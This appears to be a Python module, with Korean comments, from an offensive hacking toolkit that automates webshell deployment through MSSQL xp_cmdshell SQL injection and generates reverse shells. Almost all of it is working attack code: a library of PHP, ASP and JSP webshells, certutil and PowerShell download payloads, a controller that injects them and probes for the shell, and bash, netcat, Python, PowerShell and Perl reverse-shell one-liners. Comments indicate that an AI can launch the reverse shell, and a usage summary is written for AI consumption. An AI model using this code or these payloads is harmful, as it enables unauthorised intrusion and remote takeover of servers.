"""
Shell Dropper — Webshell 배포 + Reverse Shell 자동화
======================================================
SQLi 또는 파일 업로드 취약점을 통해 웹쉘을 배포하고
리버스 쉘 연결까지 자동 시도.

지원 방법:
  1. SQLi INTO OUTFILE / xp_cmdshell certutil/powershell
  2. 파일 업로드 (04_webshell.py 연동)
  3. LFI → RCE (PHP session file / log poisoning)
  4. 리버스 쉘 페이로드 자동 생성 (bash/python/powershell/nc)
"""
from __future__ import annotations

import base64
import re
from dataclasses import dataclass
from typing import Callable


@dataclass
class ShellDropResult:
    success: bool
    method: str       # sqli_outfile / xp_certutil / xp_powershell / upload / lfi_log
    shell_url: str    # 배포된 웹쉘 URL (확인된 경우)
    shell_path: str   # 서버 경로
    password: str     # 웹쉘 패스워드 / 파라미터명
    evidence: str
    reverse_payload: str = ""  # 리버스 쉘 커맨드 (AI가 /hint 로 실행 가능)


# ══════════════════════════════════════════════════════════════
# 웹쉘 페이로드 라이브러리
# ══════════════════════════════════════════════════════════════

WEBSHELLS = {
    "php_minimal": "<?php @eval($_POST['x']);?>",
    "php_antsword": "<?php @eval($_POST['ant']);?>",
    "php_base64": "<?php eval(base64_decode($_POST['x']));?>",
    "php_gzip": (
        "<?php $f=gzinflate(base64_decode($_POST['x']));"
        "@eval($f);?>"
    ),
    "asp_minimal": "<%eval request(\"x\")%>",
    "asp_exec": (
        "<%Set o=CreateObject(\"Wscript.Shell\"):"
        "o.Run(request(\"cmd\"))%>"
    ),
    "aspx_minimal": (
        "<%@ Page Language=\"C#\"%><%eval(Request[\"x\"],\"unsafe\");%>"
    ),
    "jsp_minimal": (
        "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>"
    ),
    "php_image_poly": (
        "\xff\xd8\xff\xe0"  # JPEG magic
        "<?php @eval($_POST['x']);?>"
    ),
}

SHELL_PASSWORD_DEFAULT = "x"

# ══════════════════════════════════════════════════════════════
# MSSQL xp_cmdshell → certutil / powershell 웹쉘 배포
# ══════════════════════════════════════════════════════════════

def mssql_xp_drop_shell(
    webroot: str,
    shell_type: str = "asp_minimal",
    lhost: str = "127.0.0.1",
) -> list[str]:
    """
    xp_cmdshell을 사용한 웹쉘 배포 페이로드 목록 반환.
    webroot: 예) C:\\inetpub\\wwwroot\\
    """
    shell_content = WEBSHELLS[shell_type]
    encoded = base64.b64encode(shell_content.encode()).decode()

    payloads = []

    # 방법 1: certutil base64 디코딩
    fname = "x.asp" if "asp" in shell_type else "x.php"
    certutil_cmd = (
        f"certutil -decode C:\\Windows\\Temp\\b64.txt {webroot}{fname}"
    )
    echo_cmd = f"echo {encoded} > C:\\Windows\\Temp\\b64.txt"

    payloads.append(
        f"'; EXEC master..xp_cmdshell '{echo_cmd}';--"
    )
    payloads.append(
        f"'; EXEC master..xp_cmdshell '{certutil_cmd}';--"
    )

    # 방법 2: PowerShell DownloadFile (원격 서버에서)
    ps_cmd = (
        f"powershell -c \"(New-Object Net.WebClient).DownloadFile("
        f"'http://{lhost}/shell.asp','{webroot}x2.asp');\""
    )
    payloads.append(
        f"'; EXEC master..xp_cmdshell '{ps_cmd}';--"
    )

    # 방법 3: echo 직접 쓰기 (짧은 ASP)
    short_asp = "<%eval request(chr(120))%>"
    echo_direct = f"echo {short_asp} > {webroot}sx.asp"
    payloads.append(
        f"'; EXEC master..xp_cmdshell '{echo_direct}';--"
    )

    return payloads


# ══════════════════════════════════════════════════════════════
# 리버스 쉘 페이로드 생성
# ══════════════════════════════════════════════════════════════

def gen_reverse_shell(lhost: str, lport: int, shell_type: str = "auto") -> dict[str, str]:
    """
    여러 리버스 쉘 페이로드 생성.
    반환: {shell_type: command_string}
    """
    payloads: dict[str, str] = {}

    # Bash
    payloads["bash"] = (
        f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    )
    payloads["bash_196"] = (
        f"0<&196;exec 196<>/dev/tcp/{lhost}/{lport};"
        f" sh <&196 >&196 2>&196"
    )

    # Python
    py_cmd = (
        f"import socket,subprocess,os;"
        f"s=socket.socket();"
        f"s.connect(('{lhost}',{lport}));"
        f"os.dup2(s.fileno(),0);"
        f"os.dup2(s.fileno(),1);"
        f"os.dup2(s.fileno(),2);"
        f"subprocess.call(['/bin/sh','-i'])"
    )
    payloads["python3"] = f"python3 -c \"{py_cmd}\""

    # Netcat
    payloads["nc"] = f"nc -e /bin/sh {lhost} {lport}"
    payloads["nc_mkfifo"] = (
        f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|"
        f"/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
    )

    # PowerShell (Windows)
    ps_payload = (
        f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
        f"$stream = $client.GetStream();"
        f"[byte[]]$bytes = 0..65535|%{{0}};"
        f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
        f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
        f"$sendback = (iex $data 2>&1 | Out-String );"
        f"$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
        f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        f"$stream.Write($sendbyte,0,$sendbyte.Length);"
        f"$stream.Flush()}};"
        f"$client.Close()"
    )
    ps_enc = base64.b64encode(ps_payload.encode("utf-16-le")).decode()
    payloads["powershell_b64"] = f"powershell -enc {ps_enc}"

    # PHP webshell → reverse (system으로 bash 실행)
    payloads["php_system"] = (
        f"<?php system('bash -i >& /dev/tcp/{lhost}/{lport} 0>&1');?>"
    )

    # Perl
    payloads["perl"] = (
        f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
        f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
        f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");"
        f"open(STDOUT,\">&S\");open(STDERR,\">&S\");"
        f"exec(\"/bin/sh -i\");}};'"
    )

    return payloads


# ══════════════════════════════════════════════════════════════
# 자동 쉘 드로퍼 컨트롤러
# ══════════════════════════════════════════════════════════════

class ShellDropper:
    """
    웹쉘 배포 자동화 컨트롤러.
    SQLi 엔진 또는 업로드 모듈과 연계하여 사용.
    """

    def __init__(
        self,
        send_payload_fn: Callable[[str], str],
        probe_url_fn: Callable[[str], int],  # URL → HTTP status
        db_type: str = "mssql",
        target_base_url: str = "",
        log_fn: Callable[[str], None] | None = None,
    ):
        self._send = send_payload_fn
        self._probe = probe_url_fn
        self.db_type = db_type
        self.base_url = target_base_url.rstrip("/")
        self.log = log_fn or (lambda s: None)

    def auto_drop(
        self,
        webroot: str = "C:\\inetpub\\wwwroot\\",
        lhost: str = "127.0.0.1",
        lport: int = 4444,
    ) -> ShellDropResult:
        """
        MSSQL xp_cmdshell 웹쉘 배포 자동 시도.
        성공 시 ShellDropResult 반환.
        """
        self.log("[ShellDrop] MSSQL xp_cmdshell 웹쉘 배포 시작...")

        shell_files = ["x.asp", "sx.asp", "x2.asp"]
        webroots_to_try = [
            webroot,
            "C:\\inetpub\\wwwroot\\",
            "D:\\inetpub\\wwwroot\\",
            "C:\\inetpub\\wwwroot\\upload\\",
            "D:\\wwwroot\\",
        ]

        for wroot in webroots_to_try:
            payloads = mssql_xp_drop_shell(
                webroot=wroot, shell_type="asp_minimal", lhost=lhost
            )
            for pl in payloads:
                self._send(pl)

            # 배포 확인
            for sf in shell_files:
                # URL 경로 추정 (웹루트 → URL 경로 변환)
                url_path = sf
                check_url = f"{self.base_url}/{url_path}"
                try:
                    status = self._probe(check_url)
                    if status == 200:
                        self.log(f"[ShellDrop✓] 웹쉘 확인: {check_url}")
                        rev_shells = gen_reverse_shell(lhost, lport)
                        return ShellDropResult(
                            success=True,
                            method="xp_certutil",
                            shell_url=check_url,
                            shell_path=f"{wroot}{sf}",
                            password=SHELL_PASSWORD_DEFAULT,
                            evidence=f"HTTP 200 at {check_url}",
                            reverse_payload=rev_shells.get("powershell_b64", ""),
                        )
                except Exception:
                    pass

        self.log("[ShellDrop✗] xp_cmdshell 웹쉘 배포 실패")
        return ShellDropResult(
            success=False,
            method="xp_cmdshell",
            shell_url="",
            shell_path="",
            password="",
            evidence="All webroot paths failed",
        )

    def gen_all_reverse_shells(self, lhost: str, lport: int) -> dict[str, str]:
        """리버스 쉘 전체 목록 생성"""
        return gen_reverse_shell(lhost, lport)


# ══════════════════════════════════════════════════════════════
# 공개 AI용 요약 문자열
# ══════════════════════════════════════════════════════════════

SHELL_DROPPER_SUMMARY = """
=== SHELL DROPPER (AUTO WEBSHELL + REVERSE SHELL) ===

MSSQL xp_cmdshell webshell deployment:
  [1] echo base64 > C:\\Windows\\Temp\\b64.txt
  [2] certutil -decode b64.txt {webroot}x.asp
  [3] PowerShell DownloadFile from attacker VPS
  [4] echo direct short ASP: <%eval request(chr(120))%>

Reverse shell auto-generation (gen_reverse_shell):
  bash    → bash -i >& /dev/tcp/LHOST/LPORT 0>&1
  python3 → import socket...subprocess.call(['/bin/sh','-i'])
  nc      → nc -e /bin/sh LHOST LPORT
  powershell → base64 encoded TCP reverse shell
  php     → <?php system('bash ...'); ?>

Usage:
  from bingo.tools.shell_dropper import ShellDropper, gen_reverse_shell
  dropper = ShellDropper(send_fn, probe_fn, db_type='mssql', base_url='http://target')
  result = dropper.auto_drop(webroot='C:\\\\inetpub\\\\wwwroot\\\\', lhost='1.2.3.4', lport=4444)
  shells = gen_reverse_shell('1.2.3.4', 4444)
"""
